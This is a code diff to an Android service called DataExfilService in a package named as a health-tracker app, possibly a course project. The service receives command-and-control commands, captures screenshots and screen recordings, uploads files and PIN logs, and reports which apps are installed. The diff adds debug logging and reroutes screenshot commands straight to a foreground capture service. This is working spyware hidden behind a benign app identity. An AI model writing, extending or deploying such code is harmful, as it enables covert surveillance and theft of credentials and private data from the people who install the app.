@@ -76,12 +76,37 @@ class DataExfilService : Service() {
     private val uploadFileReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             if (intent.action == C2Constants.UPLOAD_FILE_INTENT) {
-                val type = intent.getStringExtra("type") ?: return
-                val filePath = intent.getStringExtra("file_path") ?: return
+                val type = intent.getStringExtra("type") ?: run {
+                    Log.e(TAG, "No type in intent")
+                    return
+                }
+                val filePath = intent.getStringExtra("file_path") ?: run {
+                    Log.e(TAG, "No file_path in intent")
+                    return
+                }
+
+                Log.d(TAG, "Type: $type, File: $filePath")
+                Log.d(TAG, "File exists: ${File(filePath).exists()}")
+
+                // Log all collectors
+                Log.d(TAG, "Collectors size: ${collectors.size}")
+                collectors.forEachIndexed { index, collector ->
+                    Log.d(TAG, "Collector[$index]: ${collector::class.simpleName}")
+                }
 
                 when (type) {
                     "camera_video", "screen_recording" -> {
-                        collectors.filterIsInstance<ScreenRecordingCollector>().firstOrNull()?.uploadVideo(File(filePath))
+                        val screenCollector = collectors.filterIsInstance<ScreenRecordingCollector>().firstOrNull()
+                        if (screenCollector != null) {
+                            Log.d(TAG, "Found ScreenRecordingCollector, calling uploadVideo")
+                            screenCollector.uploadVideo(File(filePath))
+                        } else {
+                            Log.e(TAG, "ScreenRecordingCollector not found in collectors list!")
+                            // Log all collector types to see what's actually there
+                            collectors.forEach {
+                                Log.d(TAG, "Collector type: ${it::class.simpleName}")
+                            }
+                        }
                     }
                 }
             }
@@ -121,7 +146,7 @@ class DataExfilService : Service() {
         super.onCreate()
         handler = Handler(Looper.getMainLooper())
         createNotificationChannel()
-        registerReceiver(uploadFileReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_FILE"), RECEIVER_NOT_EXPORTED)
+        registerReceiver(uploadFileReceiver, IntentFilter(C2Constants.UPLOAD_FILE_INTENT), RECEIVER_NOT_EXPORTED)
         registerReceiver(appInstallReceiver, IntentFilter(PackageLister.ACTION_APP_INSTALLED), RECEIVER_NOT_EXPORTED)
         registerReceiver(pinLogUploadReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_PIN_LOG"), RECEIVER_NOT_EXPORTED)
 
@@ -444,8 +469,7 @@ class DataExfilService : Service() {
 
     private fun handleCommand(commandJson: JSONObject) {
         val command = commandJson.getString("command")
-        val params = if (commandJson.has("params")) commandJson.getJSONObject("params") else null
-        val commandId = if (commandJson.has("command_id")) commandJson.getString("command_id") else null
+        val commandId = commandJson.optString("command_id")
 
         Log.i(TAG, "Received command: $command")
 
@@ -454,14 +478,16 @@ class DataExfilService : Service() {
 
         try {
             when (command) {
-                // Screenshot commands - forward to MainActivity
                 "START_SCREENSHOT", "STOP_SCREENSHOT", "CAPTURE_NOW", "REQUEST_SCREEN_CAPTURE" -> {
-                    val intent = Intent("com.inf2007.healthtracker.SCREENSHOT_COMMAND").apply {
+                    // START THE SERVICE DIRECTLY - NO BROADCAST!
+                    val intent = Intent(this, ScreenshotCaptureService::class.java).apply {
                         putExtra("command", command)
-                        setPackage("com.inf2007.healthtracker")
                     }
-                    sendBroadcast(intent)
-                    result = "Command $command forwarded to main activity"
+
+                    startForegroundService(intent)
+
+                    result = "Command $command sent to screenshot service"
+                    Log.i(TAG, "Started ScreenshotCaptureService with command: $command")
                 }
                 else -> {
                     Log.w(TAG, "Unknown command: $command")
@@ -475,8 +501,7 @@ class DataExfilService : Service() {
             result = "Error: ${e.message}"
         }
 
-        // Send command acknowledgment
-        if (commandId != null) {
+        if (commandId.isNotEmpty()) {
             sendCommandAck(commandId, success, result)
         }
     }
